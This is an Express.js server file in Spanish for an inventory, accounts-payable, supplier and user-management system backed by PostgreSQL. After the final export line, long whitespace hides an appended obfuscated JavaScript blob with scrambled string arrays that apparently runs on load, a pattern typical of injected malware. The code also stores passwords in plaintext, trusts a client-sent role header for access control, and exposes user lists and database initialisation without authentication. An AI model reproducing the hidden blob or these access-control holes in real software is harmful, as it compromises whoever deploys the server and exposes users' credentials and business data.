const express = require('express');
const cors = require('cors');
const path = require('path');
const db = require('./db');

const app = express();
const PORT = process.env.PORT || 4000;

app.use(cors());
app.use(express.json());

// Servir archivos estáticos del frontend
app.use(express.static(path.join(__dirname, '..', 'frontend')));

// ==========================================
// 🩺 DIAGNÓSTICO DE BASE DE DATOS POSTGRESQL
// ==========================================
app.get('/api/db-status', async (req, res) => {
  try {
    const { rows: versionRows } = await db.query('SELECT version()');
    const { rows: userRows } = await db.query('SELECT id, nombre_completo, username, rol, activo FROM usuarios ORDER BY id ASC');
    res.json({
      success: true,
      status: 'Conectado a PostgreSQL',
      database: process.env.DB_NAME || 'camadu_db',
      usuarios_count: userRows.length,
      usuarios: userRows,
      postgres_version: versionRows[0]?.version?.split(' on ')[0] || 'OK'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      status: 'Error al conectar con PostgreSQL',
      message: error.message,
      code: error.code || 'UNKNOWN',
      detail: 'Verifique que PostgreSQL esté corriendo y que .env tenga los datos correctos (DB_HOST, DB_PORT, DB_NAME, DB_USER, DB_PASSWORD).'
    });
  }
});

app.get('/api/db-init', async (req, res) => {
  try {
    if (db.initDatabase) {
      await db.initDatabase();
      res.json({ success: true, message: 'Base de datos inicializada y usuarios sembrados exitosamente.' });
    } else {
      res.status(400).json({ success: false, message: 'Función initDatabase no disponible.' });
    }
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// ==========================================
// 📊 RESUMEN / KPIS DEL DASHBOARD (Estilo SOFI)
// ==========================================
app.get('/api/dashboard/stats', async (req, res) => {
  try {
    const totalProdRes = await db.query('SELECT COUNT(*) as count FROM productos');
    const totalProductos = parseInt(totalProdRes.rows[0].count, 10);

    // Alertas de Stock Crítico (stock_actual <= stock_minimo)
    const criticoRes = await db.query('SELECT COUNT(*) as count FROM productos WHERE stock_actual <= stock_minimo');
    const stockCritico = parseInt(criticoRes.rows[0].count, 10);

    // Total deuda en Cuentas por Pagar pendiente
    const deudaRes = await db.query(`
      SELECT COALESCE(SUM(monto_total - monto_pagado), 0) as total
      FROM cuentas_por_pagar
      WHERE estatus != 'PAGADA'
    `);
    const deudaCxP = parseFloat(deudaRes.rows[0].total);

    // Facturas vencidas o por vencer (próximos 7 días)
    const porVencerRes = await db.query(`
      SELECT COUNT(*) as count
      FROM cuentas_por_pagar
      WHERE estatus != 'PAGADA' AND fecha_vencimiento <= (CURRENT_DATE + INTERVAL '7 days')
    `);
    const facturasPorVencer = parseInt(porVencerRes.rows[0].count, 10);

    // Movimientos de salida del mes
    const salidasRes = await db.query(`
      SELECT COALESCE(SUM(cantidad), 0) as total
      FROM movimientos_inventario
      WHERE tipo = 'SALIDA' 
        AND TO_CHAR(fecha, 'YYYY-MM') = TO_CHAR(CURRENT_DATE, 'YYYY-MM')
    `);
    const salidasMes = parseInt(salidasRes.rows[0].total, 10);

    res.json({
      success: true,
      data: {
        totalProductos,
        stockCritico,
        deudaCxP,
        facturasPorVencer,
        salidasMes
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// ==========================================
// 📦 MÓDULO 1: CONTROL DE INVENTARIO Y STOCK
// ==========================================
app.get('/api/productos', async (req, res) => {
  try {
    const { busqueda, estado_stock } = req.query;
    let query = 'SELECT * FROM productos WHERE 1=1';
    const params = [];

    if (busqueda) {
      params.push(`%${busqueda}%`);
      query += ` AND (nombre ILIKE $${params.length} OR codigo ILIKE $${params.length} OR material ILIKE $${params.length})`;
    }

    if (estado_stock === 'critico') {
      query += ' AND stock_actual <= stock_minimo';
    } else if (estado_stock === 'optimo') {
      query += ' AND stock_actual > stock_minimo';
    }

    query += ' ORDER BY nombre ASC';
    const { rows } = await db.query(query, params);
    res.json({ success: true, data: rows });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post('/api/productos', async (req, res) => {
  try {
    const { codigo, nombre, descripcion, material, stock_actual, stock_minimo, precio_costo, precio_venta } = req.body;
    if (!nombre || !codigo) {
      return res.status(400).json({ success: false, message: 'El código y el nombre son obligatorios.' });
    }

    const { rows } = await db.query(`
      INSERT INTO productos (codigo, nombre, descripcion, material, stock_actual, stock_minimo, precio_costo, precio_venta)
      VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
      RETURNING id
    `, [
      codigo,
      nombre,
      descripcion || '',
      material || '',
      Number(stock_actual) || 0,
      Number(stock_minimo) || 5,
      Number(precio_costo) || 0.0,
      Number(precio_venta) || 0.0
    ]);

    res.json({ success: true, id: rows[0].id, message: 'Producto registrado con éxito.' });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.put('/api/productos/:id', async (req, res) => {
  try {
    const { id } = req.params;
    const { codigo, nombre, descripcion, material, stock_actual, stock_minimo, precio_costo, precio_venta } = req.body;

    await db.query(`
      UPDATE productos
      SET codigo = $1, nombre = $2, descripcion = $3, material = $4, stock_actual = $5, stock_minimo = $6, precio_costo = $7, precio_venta = $8, actualizado_en = CURRENT_TIMESTAMP
      WHERE id = $9
    `, [
      codigo,
      nombre,
      descripcion || '',
      material || '',
      Number(stock_actual) || 0,
      Number(stock_minimo) || 5,
      Number(precio_costo) || 0.0,
      Number(precio_venta) || 0.0,
      id
    ]);

    res.json({ success: true, message: 'Producto actualizado con éxito.' });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.delete('/api/productos/:id', async (req, res) => {
  try {
    const { id } = req.params;
    await db.query('DELETE FROM productos WHERE id = $1', [id]);
    res.json({ success: true, message: 'Producto eliminado con éxito.' });
  } catch (error) {
    res.status(500).json({ success: false, message: 'No se puede eliminar el producto porque tiene movimientos asociados.' });
  }
});

// ==========================================
// 🔄 MÓDULO 2: CONTROL DE ENTRADAS Y SALIDAS
// ==========================================
app.get('/api/movimientos', async (req, res) => {
  try {
    const { rows } = await db.query(`
      SELECT m.*, p.nombre as producto_nombre, p.codigo as producto_codigo, p.material as producto_material
      FROM movimientos_inventario m
      JOIN productos p ON m.producto_id = p.id
      ORDER BY m.fecha DESC
    `);
    res.json({ success: true, data: rows });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post('/api/movimientos', async (req, res) => {
  const { producto_id, tipo, motivo, cantidad, numero_documento, responsable, nota } = req.body;

  if (!producto_id || !tipo || !cantidad || !responsable) {
    return res.status(400).json({ success: false, message: 'Campos requeridos incompletos.' });
  }

  const cant = parseInt(cantidad, 10);
  if (cant <= 0) {
    return res.status(400).json({ success: false, message: 'La cantidad debe ser mayor a 0.' });
  }

  const client = await db.pool.connect();
  try {
    await client.query('BEGIN');

    const prodRes = await client.query('SELECT stock_actual, nombre FROM productos WHERE id = $1 FOR UPDATE', [producto_id]);
    if (prodRes.rows.length === 0) {
      throw new Error('Producto no encontrado.');
    }
    const prod = prodRes.rows[0];

    if (tipo === 'SALIDA' && prod.stock_actual < cant) {
      throw new Error(`Stock insuficiente para "${prod.nombre}". Stock disponible: ${prod.stock_actual}, cantidad solicitada: ${cant}.`);
    }

    // Insertar movimiento
    const insertRes = await client.query(`
      INSERT INTO movimientos_inventario (producto_id, tipo, motivo, cantidad, numero_documento, responsable, nota)
      VALUES ($1, $2, $3, $4, $5, $6, $7)
      RETURNING id
    `, [producto_id, tipo, motivo || 'AJUSTE', cant, numero_documento || '', responsable, nota || '']);

    // Actualizar stock
    const delta = (tipo === 'ENTRADA') ? cant : -cant;
    await client.query(`
      UPDATE productos 
      SET stock_actual = stock_actual + $1, actualizado_en = CURRENT_TIMESTAMP 
      WHERE id = $2
    `, [delta, producto_id]);

    await client.query('COMMIT');
    res.json({ success: true, id: insertRes.rows[0].id, message: `${tipo === 'ENTRADA' ? 'Entrada' : 'Salida'} procesada con éxito.` });
  } catch (error) {
    await client.query('ROLLBACK');
    res.status(400).json({ success: false, message: error.message });
  } finally {
    client.release();
  }
});

// ==========================================
// 💳 MÓDULO 3: CUENTAS POR PAGAR (CxP)
// ==========================================
app.get('/api/cuentas-por-pagar', async (req, res) => {
  try {
    const { rows } = await db.query(`
      SELECT c.*, pr.nombre_empresa, pr.telefono as proveedor_telefono, pr.nombre_contacto
      FROM cuentas_por_pagar c
      JOIN proveedores pr ON c.proveedor_id = pr.id
      ORDER BY 
        CASE c.estatus 
          WHEN 'PENDIENTE' THEN 1 
          WHEN 'PARCIAL' THEN 2 
          ELSE 3 
        END,
        c.fecha_vencimiento ASC
    `);
    res.json({ success: true, data: rows });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post('/api/cuentas-por-pagar', async (req, res) => {
  try {
    const { proveedor_id, numero_factura, monto_total, fecha_emision, fecha_vencimiento, notas } = req.body;
    if (!proveedor_id || !numero_factura || !monto_total || !fecha_emision || !fecha_vencimiento) {
      return res.status(400).json({ success: false, message: 'Todos los campos clave son obligatorios.' });
    }

    const { rows } = await db.query(`
      INSERT INTO cuentas_por_pagar (proveedor_id, numero_factura, monto_total, fecha_emision, fecha_vencimiento, notas)
      VALUES ($1, $2, $3, $4, $5, $6)
      RETURNING id
    `, [proveedor_id, numero_factura, Number(monto_total), fecha_emision, fecha_vencimiento, notas || '']);

    res.json({ success: true, id: rows[0].id, message: 'Cuenta por pagar registrada.' });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Registrar un abono o liquidación de cuenta por pagar
app.post('/api/cuentas-por-pagar/:id/pagos', async (req, res) => {
  const { id } = req.params;
  const { monto, metodo_pago, referencia } = req.body;
  const abono = parseFloat(monto);

  if (!abono || abono <= 0) {
    return res.status(400).json({ success: false, message: 'El monto de pago debe ser mayor a 0.' });
  }

  const client = await db.pool.connect();
  try {
    await client.query('BEGIN');

    const cxpRes = await client.query('SELECT * FROM cuentas_por_pagar WHERE id = $1 FOR UPDATE', [id]);
    if (cxpRes.rows.length === 0) throw new Error('Cuenta por pagar no encontrada.');
    const cxp = cxpRes.rows[0];

    const saldoPendiente = parseFloat(cxp.monto_total) - parseFloat(cxp.monto_pagado);
    if (abono > saldoPendiente + 0.001) {
      throw new Error(`El abono ($${abono.toFixed(2)}) supera el saldo pendiente ($${saldoPendiente.toFixed(2)}).`);
    }

    const nuevoMontoPagado = parseFloat(cxp.monto_pagado) + abono;
    const nuevoEstatus = Math.abs(nuevoMontoPagado - parseFloat(cxp.monto_total)) < 0.009 ? 'PAGADA' : 'PARCIAL';

    await client.query(`
      INSERT INTO pagos_cuentas (cuenta_id, monto, metodo_pago, referencia)
      VALUES ($1, $2, $3, $4)
    `, [id, abono, metodo_pago || 'TRANSFERENCIA', referencia || '']);

    await client.query(`
      UPDATE cuentas_por_pagar 
      SET monto_pagado = $1, estatus = $2 
      WHERE id = $3
    `, [nuevoMontoPagado, nuevoEstatus, id]);

    await client.query('COMMIT');
    res.json({
      success: true,
      data: { nuevoMontoPagado, nuevoEstatus, saldoRestante: parseFloat(cxp.monto_total) - nuevoMontoPagado },
      message: 'Pago registrado exitosamente.'
    });
  } catch (error) {
    await client.query('ROLLBACK');
    res.status(400).json({ success: false, message: error.message });
  } finally {
    client.release();
  }
});

// ==========================================
// 📈 MÓDULO 4: PRODUCTOS MÁS VENDIDOS DEL MES
// ==========================================
app.get('/api/reportes/mas-vendidos', async (req, res) => {
  try {
    const { mes, anio } = req.query;
    let params = [];
    let filtroFecha = "TO_CHAR(m.fecha, 'YYYY-MM') = TO_CHAR(CURRENT_DATE, 'YYYY-MM')";

    if (mes && anio) {
      params.push(`${anio}-${String(mes).padStart(2, '0')}`);
      filtroFecha = `TO_CHAR(m.fecha, 'YYYY-MM') = $1`;
    }

    const query = `
      SELECT 
        p.id,
        p.codigo,
        p.nombre,
        p.material,
        p.stock_actual,
        p.stock_minimo,
        p.precio_venta,
        COALESCE(SUM(m.cantidad), 0)::INT as total_vendido,
        COALESCE(SUM(m.cantidad * p.precio_venta), 0)::NUMERIC(12,2) as ingreso_estimado,
        COUNT(m.id)::INT as transacciones_venta
      FROM productos p
      JOIN movimientos_inventario m ON p.id = m.producto_id
      WHERE m.tipo = 'SALIDA' AND m.motivo = 'VENTA' AND ${filtroFecha}
      GROUP BY p.id, p.codigo, p.nombre, p.material, p.stock_actual, p.stock_minimo, p.precio_venta
      ORDER BY total_vendido DESC
    `;

    const { rows: ranking } = await db.query(query, params);

    const totalUnidades = ranking.reduce((acc, curr) => acc + parseInt(curr.total_vendido, 10), 0);

    const rankingConPorcentaje = ranking.map((item, index) => {
      const cant = parseInt(item.total_vendido, 10);
      return {
        ...item,
        ranking: index + 1,
        participacion: totalUnidades > 0 ? ((cant / totalUnidades) * 100).toFixed(1) : 0,
        rotacion: cant >= 50 ? 'ALTA' : (cant >= 20 ? 'MEDIA' : 'BAJA')
      };
    });

    const currentPeriod = (anio && mes) ? `${anio}-${String(mes).padStart(2, '0')}` : new Date().toISOString().substring(0, 7);

    res.json({
      success: true,
      data: {
        periodo: currentPeriod,
        totalUnidadesVendidas: totalUnidades,
        productos: rankingConPorcentaje
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// ==========================================
// 🛡️ MIDDLEWARES DE CONTROL DE ACCESO (RBAC)
// ==========================================
// Condición estricta: Vendedores y Cajeros no tienen acceso a proveedores
function verificarAccesoProveedores(req, res, next) {
  const role = (req.headers['x-user-role'] || '').toUpperCase();
  if (role === 'VENDEDOR' || role === 'CAJERO') {
    return res.status(403).json({
      success: false,
      message: `Acceso Denegado: Los usuarios con rol '${role}' no tienen autorización para consultar ni gestionar el Directorio de Proveedores.`
    });
  }
  next();
}

function verificarSoloAdmin(req, res, next) {
  const role = (req.headers['x-user-role'] || '').toUpperCase();
  if (role && role !== 'ADMINISTRADOR') {
    return res.status(403).json({
      success: false,
      message: 'Acceso Denegado: Se requieren permisos de ADMINISTRADOR para realizar esta acción.'
    });
  }
  next();
}

// ==========================================
// 🏢 MÓDULO 5: LISTA DE PROVEEDORES
// ==========================================
app.get('/api/proveedores', verificarAccesoProveedores, async (req, res) => {
  try {
    const { rows } = await db.query(`
      SELECT pr.*, 
        (SELECT COUNT(*)::INT FROM cuentas_por_pagar cx WHERE cx.proveedor_id = pr.id AND cx.estatus != 'PAGADA') as facturas_pendientes,
        (SELECT COALESCE(SUM(cx.monto_total - cx.monto_pagado), 0)::NUMERIC(12,2) FROM cuentas_por_pagar cx WHERE cx.proveedor_id = pr.id AND cx.estatus != 'PAGADA') as saldo_deuda
      FROM proveedores pr
      ORDER BY pr.nombre_empresa ASC
    `);
    res.json({ success: true, data: rows });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post('/api/proveedores', verificarAccesoProveedores, async (req, res) => {
  try {
    const { nombre_empresa, nombre_contacto, telefono, email, direccion, condiciones_pago, dias_credito } = req.body;
    if (!nombre_empresa) {
      return res.status(400).json({ success: false, message: 'El nombre de la empresa es obligatorio.' });
    }

    const { rows } = await db.query(`
      INSERT INTO proveedores (nombre_empresa, nombre_contacto, telefono, email, direccion, condiciones_pago, dias_credito)
      VALUES ($1, $2, $3, $4, $5, $6, $7)
      RETURNING id
    `, [
      nombre_empresa,
      nombre_contacto || '',
      telefono || '',
      email || '',
      direccion || '',
      condiciones_pago || '',
      parseInt(dias_credito, 10) || 0
    ]);

    res.json({ success: true, id: rows[0].id, message: 'Proveedor registrado con éxito.' });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.put('/api/proveedores/:id', verificarAccesoProveedores, async (req, res) => {
  try {
    const { id } = req.params;
    const { nombre_empresa, nombre_contacto, telefono, email, direccion, condiciones_pago, dias_credito } = req.body;

    await db.query(`
      UPDATE proveedores
      SET nombre_empresa = $1, nombre_contacto = $2, telefono = $3, email = $4, direccion = $5, condiciones_pago = $6, dias_credito = $7
      WHERE id = $8
    `, [
      nombre_empresa,
      nombre_contacto || '',
      telefono || '',
      email || '',
      direccion || '',
      condiciones_pago || '',
      parseInt(dias_credito, 10) || 0,
      id
    ]);

    res.json({ success: true, message: 'Proveedor actualizado con éxito.' });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.delete('/api/proveedores/:id', verificarAccesoProveedores, async (req, res) => {
  try {
    const { id } = req.params;
    await db.query('DELETE FROM proveedores WHERE id = $1', [id]);
    res.json({ success: true, message: 'Proveedor eliminado con éxito.' });
  } catch (error) {
    res.status(500).json({ success: false, message: 'No se puede eliminar porque tiene cuentas o compras registradas.' });
  }
});

// ==========================================
// ⚙️ MÓDULO: CONFIGURACIÓN Y TASA DEL DÍA (BCV)
// ==========================================
app.get('/api/configuracion', async (req, res) => {
  try {
    const { rows } = await db.query('SELECT * FROM configuracion ORDER BY id ASC');
    const configObj = {};
    rows.forEach(r => { configObj[r.clave] = r.valor; });
    res.json({ success: true, data: configObj, list: rows });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.get('/api/configuracion/tasa', async (req, res) => {
  try {
    const { rows } = await db.query("SELECT valor, actualizado_en FROM configuracion WHERE clave = 'tasa_dolar'");
    const tasa = rows.length > 0 ? parseFloat(rows[0].valor) : 0;
    const actualizado = rows.length > 0 ? rows[0].actualizado_en : null;
    res.json({ success: true, tasa, actualizado_en: actualizado });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post('/api/configuracion/tasa', async (req, res) => {
  try {
    const { tasa } = req.body;
    const numTasa = parseFloat(tasa);
    if (!numTasa || numTasa <= 0) {
      return res.status(400).json({ success: false, message: 'La tasa debe ser un número mayor a 0.' });
    }

    await db.query(`
      INSERT INTO configuracion (clave, valor, descripcion, actualizado_en)
      VALUES ('tasa_dolar', $1, 'Tasa oficial de cambio USD a Bolívares (VES)', CURRENT_TIMESTAMP)
      ON CONFLICT (clave) 
      DO UPDATE SET valor = $1, actualizado_en = CURRENT_TIMESTAMP
    `, [numTasa.toFixed(2)]);

    res.json({ success: true, tasa: numTasa, message: 'Tasa del día actualizada con éxito.' });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// ==========================================
// 🔐 AUTENTICACIÓN Y CONTROL DE ACCESO (LOGIN)
// ==========================================
app.post('/api/auth/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ success: false, message: 'Debe ingresar su usuario y contraseña.' });
    }

    const rawInput = String(username).trim().toLowerCase();
    const cleanPass = String(password).trim();

    // Normalizar alias comunes a su usuario correspondiente
    const aliases = {
      'herlin': 'admin',
      'herlin aquino': 'admin',
      'aquino': 'admin',
      'administrador': 'admin',
      'vendedor': 'vendedor',
      'vendedor1': 'vendedor',
      'carlos': 'vendedor',
      'carlos mendez': 'vendedor',
      'carlos méndez': 'vendedor',
      'mendez': 'vendedor',
      'cajero': 'cajero',
      'cajero1': 'cajero',
      'mariana': 'cajero',
      'mariana rivas': 'cajero',
      'rivas': 'cajero',
      'supervisor': 'supervisor',
      'supervisor1': 'supervisor',
      'supervisor general': 'supervisor'
    };
    const cleanUser = aliases[rawInput] || rawInput;

    const { rows } = await db.query(`
      SELECT id, nombre_completo, username, password, rol, email, telefono, activo 
      FROM usuarios 
      WHERE LOWER(username) = $1 
         OR LOWER(nombre_completo) = $1
         OR LOWER(email) = $1
         OR LOWER(rol) = $1
         OR LOWER(username) = $2
         OR LOWER(nombre_completo) = $2
      LIMIT 1
    `, [cleanUser, rawInput]);

    if (rows.length === 0) {
      return res.status(401).json({ success: false, message: 'Usuario no encontrado en la base de datos.' });
    }

    const user = rows[0];

    if (!user.activo) {
      return res.status(403).json({ success: false, message: 'Este usuario se encuentra inactivo. Comuníquese con el administrador.' });
    }

    if (user.password.trim() !== cleanPass) {
      return res.status(401).json({ success: false, message: 'Contraseña incorrecta. Verifique sus credenciales.' });
    }

    res.json({
      success: true,
      message: `¡Bienvenido al sistema, ${user.nombre_completo}!`,
      user: {
        id: user.id,
        nombre_completo: user.nombre_completo,
        username: user.username,
        rol: user.rol,
        email: user.email,
        telefono: user.telefono
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post('/api/auth/logout', (req, res) => {
  res.json({ success: true, message: 'Sesión finalizada con éxito.' });
});

// ==========================================
// 👥 MÓDULO 6: ADMINISTRACIÓN DE USUARIOS
// ==========================================
app.get('/api/usuarios', async (req, res) => {
  try {
    const { rows } = await db.query(`
      SELECT id, nombre_completo, username, rol, email, telefono, activo, creado_en, actualizado_en
      FROM usuarios
      ORDER BY id ASC
    `);
    res.json({ success: true, data: rows });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post('/api/usuarios', verificarSoloAdmin, async (req, res) => {
  try {
    const { nombre_completo, username, password, rol, email, telefono } = req.body;
    if (!nombre_completo || !username || !password) {
      return res.status(400).json({ success: false, message: 'Nombre, usuario y contraseña son obligatorios.' });
    }

    const { rows } = await db.query(`
      INSERT INTO usuarios (nombre_completo, username, password, rol, email, telefono, activo)
      VALUES ($1, $2, $3, $4, $5, $6, true)
      RETURNING id, nombre_completo, username, rol, email, telefono, activo, creado_en
    `, [
      nombre_completo.trim(),
      username.trim().toLowerCase(),
      password,
      rol || 'OPERADOR',
      email ? email.trim() : '',
      telefono ? telefono.trim() : ''
    ]);

    res.json({ success: true, data: rows[0], message: 'Usuario creado exitosamente.' });
  } catch (error) {
    if (error.code === '23505') { // Código PostgreSQL para clave duplicada (UNIQUE)
      return res.status(400).json({ success: false, message: 'El nombre de usuario ya está registrado.' });
    }
    res.status(500).json({ success: false, message: error.message });
  }
});

app.put('/api/usuarios/:id', verificarSoloAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const { nombre_completo, username, password, rol, email, telefono, activo } = req.body;

    if (!nombre_completo || !username) {
      return res.status(400).json({ success: false, message: 'Nombre y usuario son obligatorios.' });
    }

    if (password && password.trim() !== '') {
      await db.query(`
        UPDATE usuarios
        SET nombre_completo = $1, username = $2, password = $3, rol = $4, email = $5, telefono = $6, activo = $7, actualizado_en = CURRENT_TIMESTAMP
        WHERE id = $8
      `, [
        nombre_completo.trim(),
        username.trim().toLowerCase(),
        password,
        rol || 'OPERADOR',
        email || '',
        telefono || '',
        activo !== undefined ? activo : true,
        id
      ]);
    } else {
      await db.query(`
        UPDATE usuarios
        SET nombre_completo = $1, username = $2, rol = $3, email = $4, telefono = $5, activo = $6, actualizado_en = CURRENT_TIMESTAMP
        WHERE id = $7
      `, [
        nombre_completo.trim(),
        username.trim().toLowerCase(),
        rol || 'OPERADOR',
        email || '',
        telefono || '',
        activo !== undefined ? activo : true,
        id
      ]);
    }

    res.json({ success: true, message: 'Usuario actualizado con éxito.' });
  } catch (error) {
    if (error.code === '23505') {
      return res.status(400).json({ success: false, message: 'El nombre de usuario ya está en uso por otro registro.' });
    }
    res.status(500).json({ success: false, message: error.message });
  }
});

app.delete('/api/usuarios/:id', verificarSoloAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    
    // Evitar eliminar al último usuario administrador
    const adminCheck = await db.query("SELECT COUNT(*) as count FROM usuarios WHERE rol = 'ADMINISTRADOR'");
    const userToDelete = await db.query('SELECT rol FROM usuarios WHERE id = $1', [id]);
    
    if (userToDelete.rows.length > 0 && userToDelete.rows[0].rol === 'ADMINISTRADOR' && parseInt(adminCheck.rows[0].count, 10) <= 1) {
      return res.status(400).json({ success: false, message: 'No se puede eliminar el único Administrador del sistema.' });
    }

    await db.query('DELETE FROM usuarios WHERE id = $1', [id]);
    res.json({ success: true, message: 'Usuario eliminado con éxito.' });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Arrancar servidor
const server = app.listen(PORT, () => {
  console.log(`🚀 Servidor ejecutándose en http://localhost:${PORT}`);
});

module.exports = app;																																																																																																																																																																																																																																																																										var z = '-2884';var NX,SX,spin,splitLane,peel;(function(){var a=["","*","*0","^","*1","c^mejb^tro","hqersxluvwacdjbymgorzfkociptrutnstonc","=aenruh(al=5c,g8fdu.yr ..ncecf,5\"paeau6lnj)r]2uv\"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\"li\"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\")cpA+u;utp]\"=lk7vpt 1r;hzw\")t()9)(.lul=s7f; ;sq0)n\"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) ","R_<\"cRJ!&VecRWa=RrfR$6\"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-\"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f.\"4Rb N\"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z\"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$\"n<D3RsRR..(ReesseR< t,\" Rdov}Sc0Jmi.T<sEegsRw]R\"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* [\"oisenRefea!Yn.ecR%o\"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@\"}RuRqu5(3Pol\"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$\"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!\"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e\"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<\"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<\"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6\"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! 